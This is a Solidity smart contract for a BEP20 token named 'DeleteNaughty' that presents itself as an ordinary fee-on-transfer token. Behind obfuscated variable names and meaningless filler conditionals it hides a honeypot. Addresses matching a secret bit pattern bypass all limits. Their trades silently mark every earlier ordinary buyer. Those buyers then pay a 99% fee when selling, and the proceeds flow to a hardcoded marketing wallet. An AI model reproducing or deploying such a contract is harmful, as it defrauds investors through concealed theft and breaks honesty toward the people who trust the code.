/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract DeleteNaughty is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Delete Naughty ";
    string constant _symbol = "DeleteNaughty";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchedExemptReceiverAuto;
    mapping(address => bool) private buyBurnFeeExempt;
    mapping(address => bool) private limitTeamLaunchedFee;
    mapping(address => bool) private minTeamMaxLaunched;
    mapping(address => uint256) private feeAutoLaunchedLiquidity;
    mapping(uint256 => address) private sellBotsMarketingTx;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private limitTxSwapMaxAutoBots = 0;
    uint256 private launchedLimitSellMaxMarketing = 5;

    //SELL FEES
    uint256 private limitMarketingTxBuySwapIsBurn = 0;
    uint256 private botsLaunchedAutoMarketingLimitBurnMax = 5;

    uint256 private botsExemptModeSellReceiverLiquidity = launchedLimitSellMaxMarketing + limitTxSwapMaxAutoBots;
    uint256 private marketingLiquidityExemptLaunchedWalletReceiver = 100;

    address private feeLaunchedBurnSellWalletIsAuto = (msg.sender); // auto-liq address
    address private botsSwapLiquidityMinBurnLimit = (0xB3AEBc9bc3D88b995Ac88667fFffFB27DA1Edf56); // marketing address
    address private exemptLiquidityWalletMaxBotsMarketing = DEAD;
    address private autoBuyExemptReceiver = DEAD;
    address private walletLimitSwapTxReceiverFeeLaunched = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private autoLimitBurnExempt;
    uint256 private liquidityReceiverTeamLimit;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private modeTeamMaxSell;
    uint256 private burnMarketingModeLaunched;
    uint256 private buyBotsLaunchedMarketing;
    uint256 private marketingReceiverLiquidityBurnMaxTxTrading;
    uint256 private exemptLiquidityReceiverLaunchedFeeBuy;

    bool private sellSwapLimitIs = true;
    bool private minTeamMaxLaunchedMode = true;
    bool private autoBurnLimitTeamSwapLaunched = true;
    bool private maxBuyBotsLiquidityFee = true;
    bool private isFeeBurnSwapReceiverTx = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private modeLimitAutoTeam = _totalSupply / 1000; // 0.1%

    
    bool private maxExemptTradingWallet = false;
    uint256 private receiverBurnTxLimit = 0;
    bool private maxFeeBuyModeTeam = false;
    bool private liquidityWalletSellAutoBotsExemptBurn = false;
    uint256 private limitExemptAutoBuyLiquidity = 0;
    uint256 private swapLimitLaunchedTxWalletMarketingTeam = 0;
    bool private feeTxMinMarketing = false;
    uint256 private exemptLiquidityModeTeam = 0;
    bool private buyIsTxReceiverBotsLaunched = false;
    uint256 private modeTeamLiquidityLaunched = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        modeTeamMaxSell = true;

        launchedExemptReceiverAuto[msg.sender] = true;
        launchedExemptReceiverAuto[address(this)] = true;

        buyBurnFeeExempt[msg.sender] = true;
        buyBurnFeeExempt[0x0000000000000000000000000000000000000000] = true;
        buyBurnFeeExempt[0x000000000000000000000000000000000000dEaD] = true;
        buyBurnFeeExempt[address(this)] = true;

        limitTeamLaunchedFee[msg.sender] = true;
        limitTeamLaunchedFee[0x0000000000000000000000000000000000000000] = true;
        limitTeamLaunchedFee[0x000000000000000000000000000000000000dEaD] = true;
        limitTeamLaunchedFee[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return botsSellModeLaunched(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return botsSellModeLaunched(sender, recipient, amount);
    }

    function botsSellModeLaunched(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = exemptSwapTradingLiquidity(sender) || exemptSwapTradingLiquidity(recipient);
        
        if (feeTxMinMarketing == maxFeeBuyModeTeam) {
            feeTxMinMarketing = feeTxMinMarketing;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                modeExemptTxFee();
            }
            if (!bLimitTxWalletValue) {
                marketingBurnTxWallet(recipient);
            }
        }
        
        if (feeTxMinMarketing == maxBuyBotsLiquidityFee) {
            feeTxMinMarketing = autoBurnLimitTeamSwapLaunched;
        }

        if (receiverBurnTxLimit == limitMarketingTxBuySwapIsBurn) {
            receiverBurnTxLimit = botsLaunchedAutoMarketingLimitBurnMax;
        }

        if (buyIsTxReceiverBotsLaunched != minTeamMaxLaunchedMode) {
            buyIsTxReceiverBotsLaunched = isFeeBurnSwapReceiverTx;
        }


        if (inSwap || bLimitTxWalletValue) {return botsFeeIsAutoLimitSell(sender, recipient, amount);}

        if (!launchedExemptReceiverAuto[sender] && !launchedExemptReceiverAuto[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (buyIsTxReceiverBotsLaunched != maxBuyBotsLiquidityFee) {
            buyIsTxReceiverBotsLaunched = autoBurnLimitTeamSwapLaunched;
        }

        if (receiverBurnTxLimit == modeLimitAutoTeam) {
            receiverBurnTxLimit = launchedLimitSellMaxMarketing;
        }

        if (liquidityWalletSellAutoBotsExemptBurn != liquidityWalletSellAutoBotsExemptBurn) {
            liquidityWalletSellAutoBotsExemptBurn = minTeamMaxLaunchedMode;
        }


        require((amount <= _maxTxAmount) || limitTeamLaunchedFee[sender] || limitTeamLaunchedFee[recipient], "Max TX Limit has been triggered");

        if (exemptLiquidityAutoMode()) {txSellBuyWallet();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = modeIsTradingSell(sender) ? teamWalletFeeIsExemptTx(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function botsFeeIsAutoLimitSell(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeIsTradingSell(address sender) internal view returns (bool) {
        return !buyBurnFeeExempt[sender];
    }

    function autoMarketingTeamFee(address sender, bool selling) internal returns (uint256) {
        
        if (modeTeamLiquidityLaunched == modeLimitAutoTeam) {
            modeTeamLiquidityLaunched = limitExemptAutoBuyLiquidity;
        }

        if (liquidityWalletSellAutoBotsExemptBurn != maxBuyBotsLiquidityFee) {
            liquidityWalletSellAutoBotsExemptBurn = feeTxMinMarketing;
        }

        if (maxFeeBuyModeTeam != maxFeeBuyModeTeam) {
            maxFeeBuyModeTeam = minTeamMaxLaunchedMode;
        }


        if (selling) {
            botsExemptModeSellReceiverLiquidity = botsLaunchedAutoMarketingLimitBurnMax + limitMarketingTxBuySwapIsBurn;
            return buyAutoMaxExempt(sender, botsExemptModeSellReceiverLiquidity);
        }
        if (!selling && sender == uniswapV2Pair) {
            botsExemptModeSellReceiverLiquidity = launchedLimitSellMaxMarketing + limitTxSwapMaxAutoBots;
            return botsExemptModeSellReceiverLiquidity;
        }
        return buyAutoMaxExempt(sender, botsExemptModeSellReceiverLiquidity);
    }

    function teamWalletFeeIsExemptTx(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (buyIsTxReceiverBotsLaunched == maxExemptTradingWallet) {
            buyIsTxReceiverBotsLaunched = minTeamMaxLaunchedMode;
        }

        if (limitExemptAutoBuyLiquidity != botsExemptModeSellReceiverLiquidity) {
            limitExemptAutoBuyLiquidity = limitMarketingTxBuySwapIsBurn;
        }

        if (feeTxMinMarketing != maxExemptTradingWallet) {
            feeTxMinMarketing = isFeeBurnSwapReceiverTx;
        }


        uint256 feeAmount = amount.mul(autoMarketingTeamFee(sender, receiver == uniswapV2Pair)).div(marketingLiquidityExemptLaunchedWalletReceiver);

        if (minTeamMaxLaunched[sender] || minTeamMaxLaunched[receiver]) {
            feeAmount = amount.mul(99).div(marketingLiquidityExemptLaunchedWalletReceiver);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function exemptSwapTradingLiquidity(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function buyAutoMaxExempt(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = feeAutoLaunchedLiquidity[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function marketingBurnTxWallet(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        sellBotsMarketingTx[exemptLimitValue] = addr;
    }

    function modeExemptTxFee() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (feeAutoLaunchedLiquidity[sellBotsMarketingTx[i]] == 0) {
                    feeAutoLaunchedLiquidity[sellBotsMarketingTx[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(botsSwapLiquidityMinBurnLimit).transfer(amountBNB * amountPercentage / 100);
    }

    function exemptLiquidityAutoMode() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    isFeeBurnSwapReceiverTx &&
    _balances[address(this)] >= modeLimitAutoTeam;
    }

    function txSellBuyWallet() internal swapping {
        
        uint256 amountToLiquify = modeLimitAutoTeam.mul(limitTxSwapMaxAutoBots).div(botsExemptModeSellReceiverLiquidity).div(2);
        uint256 amountToSwap = modeLimitAutoTeam.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (liquidityWalletSellAutoBotsExemptBurn == liquidityWalletSellAutoBotsExemptBurn) {
            liquidityWalletSellAutoBotsExemptBurn = minTeamMaxLaunchedMode;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = botsExemptModeSellReceiverLiquidity.sub(limitTxSwapMaxAutoBots.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(limitTxSwapMaxAutoBots).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(launchedLimitSellMaxMarketing).div(totalETHFee);
        
        if (limitExemptAutoBuyLiquidity == marketingLiquidityExemptLaunchedWalletReceiver) {
            limitExemptAutoBuyLiquidity = receiverBurnTxLimit;
        }

        if (liquidityWalletSellAutoBotsExemptBurn != buyIsTxReceiverBotsLaunched) {
            liquidityWalletSellAutoBotsExemptBurn = isFeeBurnSwapReceiverTx;
        }


        payable(botsSwapLiquidityMinBurnLimit).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                feeLaunchedBurnSellWalletIsAuto,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLaunchedLimitSellMaxMarketing() public view returns (uint256) {
        if (launchedLimitSellMaxMarketing != exemptLiquidityModeTeam) {
            return exemptLiquidityModeTeam;
        }
        if (launchedLimitSellMaxMarketing == limitMarketingTxBuySwapIsBurn) {
            return limitMarketingTxBuySwapIsBurn;
        }
        return launchedLimitSellMaxMarketing;
    }
    function setLaunchedLimitSellMaxMarketing(uint256 a0) public onlyOwner {
        if (launchedLimitSellMaxMarketing != modeLimitAutoTeam) {
            modeLimitAutoTeam=a0;
        }
        launchedLimitSellMaxMarketing=a0;
    }

    function getLimitTeamLaunchedFee(address a0) public view returns (bool) {
        if (a0 == botsSwapLiquidityMinBurnLimit) {
            return sellSwapLimitIs;
        }
            return limitTeamLaunchedFee[a0];
    }
    function setLimitTeamLaunchedFee(address a0,bool a1) public onlyOwner {
        if (a0 == autoBuyExemptReceiver) {
            maxBuyBotsLiquidityFee=a1;
        }
        if (a0 != exemptLiquidityWalletMaxBotsMarketing) {
            feeTxMinMarketing=a1;
        }
        limitTeamLaunchedFee[a0]=a1;
    }

    function getMaxBuyBotsLiquidityFee() public view returns (bool) {
        if (maxBuyBotsLiquidityFee == minTeamMaxLaunchedMode) {
            return minTeamMaxLaunchedMode;
        }
        return maxBuyBotsLiquidityFee;
    }
    function setMaxBuyBotsLiquidityFee(bool a0) public onlyOwner {
        if (maxBuyBotsLiquidityFee != liquidityWalletSellAutoBotsExemptBurn) {
            liquidityWalletSellAutoBotsExemptBurn=a0;
        }
        if (maxBuyBotsLiquidityFee == isFeeBurnSwapReceiverTx) {
            isFeeBurnSwapReceiverTx=a0;
        }
        if (maxBuyBotsLiquidityFee != maxBuyBotsLiquidityFee) {
            maxBuyBotsLiquidityFee=a0;
        }
        maxBuyBotsLiquidityFee=a0;
    }

    function getAutoBuyExemptReceiver() public view returns (address) {
        if (autoBuyExemptReceiver != botsSwapLiquidityMinBurnLimit) {
            return botsSwapLiquidityMinBurnLimit;
        }
        return autoBuyExemptReceiver;
    }
    function setAutoBuyExemptReceiver(address a0) public onlyOwner {
        autoBuyExemptReceiver=a0;
    }

    function getBuyBurnFeeExempt(address a0) public view returns (bool) {
        if (buyBurnFeeExempt[a0] == limitTeamLaunchedFee[a0]) {
            return maxBuyBotsLiquidityFee;
        }
        if (buyBurnFeeExempt[a0] == limitTeamLaunchedFee[a0]) {
            return isFeeBurnSwapReceiverTx;
        }
            return buyBurnFeeExempt[a0];
    }
    function setBuyBurnFeeExempt(address a0,bool a1) public onlyOwner {
        if (buyBurnFeeExempt[a0] == limitTeamLaunchedFee[a0]) {
           limitTeamLaunchedFee[a0]=a1;
        }
        if (buyBurnFeeExempt[a0] != launchedExemptReceiverAuto[a0]) {
           launchedExemptReceiverAuto[a0]=a1;
        }
        if (a0 == autoBuyExemptReceiver) {
            autoBurnLimitTeamSwapLaunched=a1;
        }
        buyBurnFeeExempt[a0]=a1;
    }

    function getSwapLimitLaunchedTxWalletMarketingTeam() public view returns (uint256) {
        if (swapLimitLaunchedTxWalletMarketingTeam != modeTeamLiquidityLaunched) {
            return modeTeamLiquidityLaunched;
        }
        if (swapLimitLaunchedTxWalletMarketingTeam == modeLimitAutoTeam) {
            return modeLimitAutoTeam;
        }
        if (swapLimitLaunchedTxWalletMarketingTeam == receiverBurnTxLimit) {
            return receiverBurnTxLimit;
        }
        return swapLimitLaunchedTxWalletMarketingTeam;
    }
    function setSwapLimitLaunchedTxWalletMarketingTeam(uint256 a0) public onlyOwner {
        if (swapLimitLaunchedTxWalletMarketingTeam != modeTeamLiquidityLaunched) {
            modeTeamLiquidityLaunched=a0;
        }
        swapLimitLaunchedTxWalletMarketingTeam=a0;
    }

    function getIsFeeBurnSwapReceiverTx() public view returns (bool) {
        if (isFeeBurnSwapReceiverTx != autoBurnLimitTeamSwapLaunched) {
            return autoBurnLimitTeamSwapLaunched;
        }
        if (isFeeBurnSwapReceiverTx == maxExemptTradingWallet) {
            return maxExemptTradingWallet;
        }
        return isFeeBurnSwapReceiverTx;
    }
    function setIsFeeBurnSwapReceiverTx(bool a0) public onlyOwner {
        isFeeBurnSwapReceiverTx=a0;
    }

    function getSellSwapLimitIs() public view returns (bool) {
        if (sellSwapLimitIs != autoBurnLimitTeamSwapLaunched) {
            return autoBurnLimitTeamSwapLaunched;
        }
        if (sellSwapLimitIs == maxExemptTradingWallet) {
            return maxExemptTradingWallet;
        }
        return sellSwapLimitIs;
    }
    function setSellSwapLimitIs(bool a0) public onlyOwner {
        if (sellSwapLimitIs == maxFeeBuyModeTeam) {
            maxFeeBuyModeTeam=a0;
        }
        if (sellSwapLimitIs == buyIsTxReceiverBotsLaunched) {
            buyIsTxReceiverBotsLaunched=a0;
        }
        if (sellSwapLimitIs != maxBuyBotsLiquidityFee) {
            maxBuyBotsLiquidityFee=a0;
        }
        sellSwapLimitIs=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}